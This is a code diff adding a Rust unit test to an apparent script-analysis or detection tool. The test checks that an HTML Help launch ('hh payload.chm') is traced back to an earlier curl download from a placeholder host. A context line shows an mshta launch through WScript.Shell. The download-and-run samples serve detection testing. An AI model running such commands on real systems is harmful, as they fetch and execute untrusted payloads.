@@ -11698,6 +11698,27 @@ new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payloa
     }
 
     #[test]
+    fn html_help_local_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.chm https://hh-local-source.example/payload.chm
+hh payload.chm"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "hh payload.chm"
+                            && url == "https://hh-local-source.example/payload.chm"
+                )
+            }),
+            "HTML Help local launch did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn browser_url_launchers_emit_url_launch() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
